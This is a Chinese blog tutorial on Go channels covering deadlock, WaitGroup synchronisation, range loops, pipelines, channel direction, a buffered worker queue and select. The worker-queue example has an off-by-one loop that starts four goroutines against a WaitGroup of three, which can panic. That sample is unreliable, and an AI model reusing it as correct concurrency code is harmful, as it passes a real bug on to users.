&lt;p&gt;比如，在main函数中，它有一个默认的goroutine，如果在此goroutine中创建一个unbuffered channel，并在main goroutine中向此channel中发送数据并直接receive数据，将会出现死锁：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main 

import (
    &quot;fmt&quot;
)

func main (){
    goo(32)
}

func goo(s int) {
    counter := make(chan int)
    counter &amp;lt;- s
    fmt.Println(&amp;lt;-counter)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在上面的示例中，向unbuffered channel中send数据的操作&lt;code&gt;counter &amp;lt;- s&lt;/code&gt;是在main goroutine中进行的，从此channel中recv的操作&lt;code&gt;&amp;lt;-counter&lt;/code&gt;也是在main goroutine中进行的。send的时候会直接阻塞main goroutine，使得recv操作无法被执行，go将探测到此问题，并报错：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;fatal error: all goroutines are asleep - deadlock!
goroutine 1 [chan send]:&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;要修复此问题，只需将send操作放在另一个goroutine中执行即可：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
)

func main() {
    goo(32)
}

func goo(s int) {
    counter := make(chan int)
    go func() {
        counter &amp;lt;- s
    }()
    fmt.Println(&amp;lt;-counter)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;或者，将counter设置为一个容量为1的buffered channel：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;counter := make(chan int,1)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样放完一个数据后send不会阻塞(被recv之前放第二个数据才会阻塞)，可以执行到recv操作。&lt;/p&gt;

&lt;h2 id=&quot;unbuffered-channel同步通信示例&quot;&gt;unbuffered channel同步通信示例&lt;/h2&gt;
&lt;p&gt;下面通过sync.WaitGroup类型来等待程序的结束，分析多个goroutine之间通信时状态的转换。因为创建的channel是unbuffered类型的，所以send和recv都是阻塞的。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
    &quot;sync&quot;
)

// wg用于等待程序执行完成
var wg sync.WaitGroup

func main() {
    count := make(chan int)

    // 增加两个待等待的goroutines
    wg.Add(2)
    fmt.Println(&quot;Start Goroutines&quot;)

    // 激活一个goroutine，label：&quot;Goroutine-1&quot;
    go printCounts(&quot;Goroutine-1&quot;, count)
    // 激活另一个goroutine，label：&quot;Goroutine-2&quot;
    go printCounts(&quot;Goroutine-2&quot;, count)

    fmt.Println(&quot;Communication of channel begins&quot;)
    // 向channel中发送初始数据
    count &amp;lt;- 1

    // 等待goroutines都执行完成
    fmt.Println(&quot;Waiting To Finish&quot;)
    wg.Wait()
    fmt.Println(&quot;\nTerminating the Program&quot;)
}
func printCounts(label string, count chan int) {
    // goroutine执行完成时，wg的计数器减1
    defer wg.Done()
    for {
        // 从channel中接收数据
        // 如果无数据可recv，则goroutine阻塞在此
        val, ok := &amp;lt;-count
        if !ok {
            fmt.Println(&quot;Channel was closed:&quot;,label)
            return
        }
        fmt.Printf(&quot;Count: %d received from %s \n&quot;, val, label)
        if val == 10 {
            fmt.Printf(&quot;Channel Closed from %s \n&quot;, label)
            // Close the channel
            close(count)
            return
        }
        // 输出接收到的数据后，加1，并重新将其send到channel中
        val++
        count &amp;lt;- val
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的程序中，激活了两个goroutine，激活这两个goroutine后，向channel中发送一个初始数据值1，然后main goroutine将因为wg.Wait()等待2个goroutine都执行完成而被阻塞。&lt;/p&gt;
&lt;p&gt;再看这两个goroutine，这两个goroutine执行完全一样的函数代码，它们都接收count这个channel的数据，但可能是goroutine1先接收到channel中的初始值1，也可能是goroutine2先接收到初始值1。接收到数据后输出值，并在输出后对数据加1，然后将加1后的数据再次send到channel，每次send都会将自己这个goroutine阻塞(因为unbuffered channel)，此时另一个goroutine因为等待recv而执行。当加1后发送给channel的数据为10之后，某goroutine将关闭count channel，该goroutine将退出，wg的计数器减1，另一个goroutine因等待recv而阻塞的状态将因为channel的关闭而失败，ok状态码将让该goroutine退出，于是wg的计数器减为0，main goroutine因为wg.Wait()而继续执行后面的代码。&lt;/p&gt;

&lt;h2 id=&quot;使用for-range迭代channel&quot;&gt;使用for range迭代channel&lt;/h2&gt;
&lt;p&gt;前面都是在for无限循环中读取channel中的数据，但也可以使用range来迭代channel，它会返回每次迭代过程中所读取的数据，直到channel被关闭。&lt;/p&gt;
&lt;p&gt;例如，将上面示例中的printCounts()改为for-range的循环形式。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;func printCounts(label string, count chan int) {
    defer wg.Done()
    for val := range count {
        fmt.Printf(&quot;Count: %d received from %s \n&quot;, val, label)
        if val == 10 {
            fmt.Printf(&quot;Channel Closed from %s \n&quot;, label)
            close(count)
            return
        }
        val++
        count &amp;lt;- val
    }
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;多个管道输出作为输入&quot;&gt;多个&quot;管道&quot;：输出作为输入&lt;/h2&gt;
&lt;p&gt;channel是goroutine与goroutine之间通信的基础，一边产生数据放进channel，另一边从channel读取放进来的数据。可以借此实现多个goroutine之间的数据交换，例如&lt;code&gt;goroutine_1-&amp;gt;goroutine_2-&amp;gt;goroutine_3&lt;/code&gt;，就像bash的管道一样，上一个命令的输出可以不断传递给下一个命令的输入，只不过golang借助channel可以在多个goroutine(如函数的执行)之间传，而bash是在命令之间传。&lt;/p&gt;
&lt;p&gt;以下是一个示例，第一个函数getRandNum()用于生成随机整数，并将生成的整数放进第一个channel ch1中，第二个函数addRandNum()用于接收ch1中的数据(来自第一个函数)，将其输出，然后对接收的值加1后放进第二个channel ch2中，第三个函数printRes接收ch2中的数据并将其输出。&lt;/p&gt;
&lt;p&gt;如果将函数认为是Linux的命令，则类似于下面的命令行：ch1相当于第一个管道，ch2相当于第二个管道&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;getRandNum | addRandNum | printRes&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以下是代码部分：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
    &quot;math/rand&quot;
    &quot;sync&quot;
)

var wg sync.WaitGroup

func main() {
    wg.Add(3)
    // 创建两个channel
    ch1 := make(chan int)
    ch2 := make(chan int)

    // 3个goroutine并行
    go getRandNum(ch1)
    go addRandNum(ch1, ch2)
    go printRes(ch2)

    wg.Wait()
}

func getRandNum(out chan int) {
    // defer the wg.Done()
    defer wg.Done()

    var random int
    // 总共生成10个随机数
    for i := 0; i &amp;lt; 10; i++ {
        // 生成[0,30)之间的随机整数并放进channel out
        random = rand.Intn(30)
        out &amp;lt;- random
    }
    close(out)
}

func addRandNum(in,out chan int) {
    defer wg.Done()
    for v := range in {
        // 输出从第一个channel中读取到的数据
        // 并将值+1后放进第二个channel中
        fmt.Println(&quot;before +1:&quot;,v)
        out &amp;lt;- (v + 1)
    }
    close(out)
}

func printRes(in chan int){
    defer wg.Done()
    for v := range in {
        fmt.Println(&quot;after +1:&quot;,v)
    }
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;指定channel的方向&quot;&gt;指定channel的方向&lt;/h2&gt;
&lt;p&gt;上面通过两个channel将3个goroutine连接起来，其中起连接作用的是第二个函数addRandNum()。在这个函数中使用了两个channel作为参数：一个channel用于接收、一个channel用于发送。&lt;/p&gt;
&lt;p&gt;其实channel类的参数变量可以指定数据流向：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;in &amp;lt;-chan int&lt;/code&gt;：表示channel in通道只用于接收数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;out chan&amp;lt;- int&lt;/code&gt;：表示channel out通道只用于发送数据&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/733013/201811/733013-20181119183702016-988051316.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;只用于接收数据的通道&lt;code&gt;&amp;lt;-chan&lt;/code&gt;不可被关闭，因为关闭通道是针对发送数据而言的，表示无数据再需发送。对于recv来说，关闭通道是没有意义的。&lt;/p&gt;
&lt;p&gt;所以，上面示例中三个函数可改写为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;func getRandNum(out chan&amp;lt;- int) {
    ...
}

func addRandNum(in &amp;lt;-chan int, out chan&amp;lt;- int) {
    ...
}

func printRes(in &amp;lt;-chan int){
    ...
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;buffered-channel异步队列请求示例&quot;&gt;buffered channel异步队列请求示例&lt;/h2&gt;
&lt;p&gt;下面是使用buffered channel实现异步处理请求的示例。&lt;/p&gt;
&lt;p&gt;在此示例中：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;有(最多)3个worker，每个worker是一个goroutine，它们有worker ID。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;每个worker都从一个buffered channel中取出待执行的任务，每个任务是一个struct结构，包含了任务id(JobID)，当前任务的队列号(ID)以及任务的状态(worker是否执行完成该任务)。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;在main goroutine中将每个任务struct发送到buffered channel中，这个buffered channel的容量为10，也就是最多只允许10个任务进行排队。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;worker每次取出任务后，输出任务号，然后执行任务(run)，最后输出任务id已完成。&lt;/li&gt;
&lt;li&gt;每个worker执行任务的方式很简单：随机睡眠0-1秒钟，并将任务标记为完成。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;以下是代码部分：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
    &quot;math/rand&quot;
    &quot;sync&quot;
    &quot;time&quot;
)

type Task struct {
    ID         int
    JobID      int
    Status     string
    CreateTime time.Time
}

func (t *Task) run() {
    sleep := rand.Intn(1000)
    time.Sleep(time.Duration(sleep) * time.Millisecond)
    t.Status = &quot;Completed&quot;
}

var wg sync.WaitGroup

// worker的数量，即使用多少goroutine执行任务
const workerNum = 3

func main() {
    wg.Add(workerNum)

    // 创建容量为10的buffered channel
    taskQueue := make(chan *Task, 10)

    // 激活goroutine，执行任务
    for workID := 0; workID &amp;lt;= workerNum; workID++ {
        go worker(taskQueue, workID)
    }
    // 将待执行任务放进buffered channel，共15个任务
    for i := 1; i &amp;lt;= 15; i++ {
        taskQueue &amp;lt;- &amp;amp;Task{
            ID:         i,
            JobID:      100 + i,
            CreateTime: time.Now(),
        }
    }
    close(taskQueue)
    wg.Wait()
}

// 从buffered channel中读取任务，并执行任务
func worker(in &amp;lt;-chan *Task, workID int) {
    defer wg.Done()
    for v := range in {
        fmt.Printf(&quot;Worker%d: recv a request: TaskID:%d, JobID:%d\n&quot;, workID, v.ID, v.JobID)
        v.run()
        fmt.Printf(&quot;Worker%d: Completed for TaskID:%d, JobID:%d\n&quot;, workID, v.ID, v.JobID)
    }
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;select多路监听&quot;&gt;select多路监听&lt;/h2&gt;
&lt;p&gt;很多时候想要同时操作多个channel，比如从ch1、ch2读数据。Go提供了一个select语句块，它像switch一样工作，里面放一些case语句块，用来轮询每个case语句块的send或recv情况。&lt;/p&gt;
&lt;p&gt;select&lt;/p&gt;
&lt;p&gt;用法格式示例：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;select {
    // ch1有数据时，读取到v1变量中
    case v1 := &amp;lt;-ch1:
        ...
    // ch2有数据时，读取到v2变量中
    case v2 := &amp;lt;-ch2:
        ...
    // 所有case都不满足条件时，执行default
    default:
        ...
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;defalut语句是可选的，不允许fall through行为，但允许case语句块为空块。select会被return、break关键字中断。&lt;/p&gt;
&lt;p&gt;select的行为模式主要是对channel是否可读进行轮询，但也可以用来向channel发送数据。它的行为如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果所有的case语句块都被阻塞，则阻塞直到某个语句块可以被处理&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;如果多个case同时满足条件，则&lt;strong&gt;随机选择&lt;/strong&gt;一个进行处理&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;如果存在default且其它case都不满足条件，则执行default。所以default必须要可执行而不能阻塞&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;需要注意的是，&lt;strong&gt;如果在select中执行send操作，则可能会永远被send阻塞。所以，在使用send的时候，应该也使用defalut语句块，保证send不会被阻塞&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;一般来说，select会放在一个无限循环语句中，一直轮询channel的可读事件。&lt;/p&gt;
&lt;p&gt;下面是一个示例，pump1()和pump2()都用于产生数据(一个产生偶数，一个产生奇数)，并将数据分别放进ch1和ch2两个通道，suck()则从ch1和ch2中读取数据。然后在无限循环中使用select轮询这两个通道是否可读，最后main goroutine在1秒后强制中断所有goroutine。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
    &quot;time&quot;
)

func main() {
    ch1 := make(chan int)
    ch2 := make(chan int)
    go pump1(ch1)
    go pump2(ch2)
    go suck(ch1, ch2)
    time.Sleep(1e9)
}
func pump1(ch chan int) {
    for i := 0; i &amp;lt;= 30; i++ {
        if i%2 == 0 {
            ch &amp;lt;- i
        }
    }
}
func pump2(ch chan int) {
    for i := 0; i &amp;lt;= 30; i++ {
        if i%2 == 1 {
            ch &amp;lt;- i
        }
    }
}
func suck(ch1 chan int, ch2 chan int) {
    for {
        select {
        case v := &amp;lt;-ch1:
            fmt.Printf(&quot;Recv on ch1: %d\n&quot;, v)
        case v := &amp;lt;-ch2:
            fmt.Printf(&quot;Recv on ch2: %d\n&quot;, v)
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Mon, 19 Nov 2018 14:50:00 +0000</pubDate>
<dc:creator>骏马金龙</dc:creator>
<og:description>channel基础 channel用于goroutines之间的通信，让它们之间可以进行数据交换。像管道一样，一个goroutine_A向channel_A中放数据，另一个goroutine_B从ch</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/f-ck-need-u/p/9986335.html</dc:identifier>
</item>
</channel>
</rss>